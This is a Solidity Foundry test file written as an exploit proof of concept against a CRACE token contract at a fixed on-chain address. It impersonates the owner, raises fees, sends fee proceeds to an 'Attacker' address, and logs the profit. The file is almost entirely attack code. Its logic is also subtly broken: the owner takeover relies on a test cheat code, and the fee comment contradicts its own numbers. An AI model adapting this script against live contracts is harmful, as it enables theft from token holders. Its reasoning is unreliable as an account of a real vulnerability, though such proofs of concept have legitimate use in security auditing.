pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface ICRACE {
    function getOwner() external view returns (address);
    function setFees(uint256 _liquidityFee, uint256 _buybackFee, uint256 _reflectionFee, uint256 _marketingFee, uint256 _feeDenominator) external;
    function setFeeReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver) external;
    function setSwapBackSettings(bool _enabled, uint256 _amount) external;
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x35240D91223186133fCb0EC1565c353eb2A546A8;
    address attacker = address(this);
    ICRACE token;
    address owner;
    address presaler = 0x8dC24A8807AB398b5c8a939288Fb010b7572827D;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Setup: Get some initial BNB for gas and token acquisition
        deal(attacker, 10 ether);

        // Label addresses for clarity
        vm.label(TARGET, "CRACE Token");
        vm.label(attacker, "Attacker");

        // Get the owner address from the contract
        token = ICRACE(TARGET);
        owner = token.getOwner();
        vm.label(owner, "Owner");

        // Get presaler address (from constructor)
        presaler = 0x8dC24A8807AB398b5c8a939288Fb010b7572827D;
        vm.label(presaler, "Presaler");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Initialize token interface
        token = ICRACE(TARGET);

        // Step 1: Read owner from storage slot 0 to confirm
        bytes32 ownerSlot = vm.load(TARGET, bytes32(uint256(0)));
        address contractOwner = address(uint160(uint256(ownerSlot)));
        console.log("Owner from storage:", contractOwner);

        // Step 2: Impersonate owner (presaler)
        vm.startPrank(contractOwner);

        // Step 3: Set fees to extremely high values: 5000 each, denominator 100 = 100% fees
        token.setFees(5000, 5000, 5000, 5000, 100);

        // Step 4: Set marketing fee receiver to attacker
        token.setFeeReceivers(contractOwner, attacker); // autoLiquidityReceiver stays owner, marketingFeeReceiver becomes attacker

        // Step 5: Get some CRACE tokens for attacker
        // As owner/presaler, transfer tokens to attacker
        uint256 tokenAmount = 1000 * 10**9;
        token.transfer(attacker, tokenAmount);
        console.log("Transferred tokens to attacker:", tokenAmount);

        // Step 6: Enable swap with low threshold
        token.setSwapBackSettings(true, 1 * 10**9); // Enable swap with low threshold (1 token)

        vm.stopPrank();

        // Step 7: As attacker, transfer tokens to trigger fee collection
        uint256 attackerBalanceBefore = address(attacker).balance;
        console.log("Attacker BNB balance before:", attackerBalanceBefore);

        // Transfer tokens - this will trigger fee collection
        // Since fees are 100%, all tokens go to contract as fees
        // Then swapBack will convert to BNB and send to marketingFeeReceiver (attacker)
        address recipient = address(0x123);
        token.transfer(recipient, 2 * 10**9); // Transfer 2 tokens
        console.log("First transfer completed");

        // Step 8: Force swapBack by making another transfer if needed
        address recipient2 = address(0x456);
        token.transfer(recipient2, 1 * 10**9);
        console.log("Second transfer completed");

        // Step 9: Check if attacker received BNB
        uint256 attackerBalanceAfter = address(attacker).balance;
        console.log("Attacker BNB balance after:", attackerBalanceAfter);

        require(attackerBalanceAfter > attackerBalanceBefore, "Attack failed: No BNB received");
        console.log("Attack successful! Profit:", attackerBalanceAfter - attackerBalanceBefore);
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

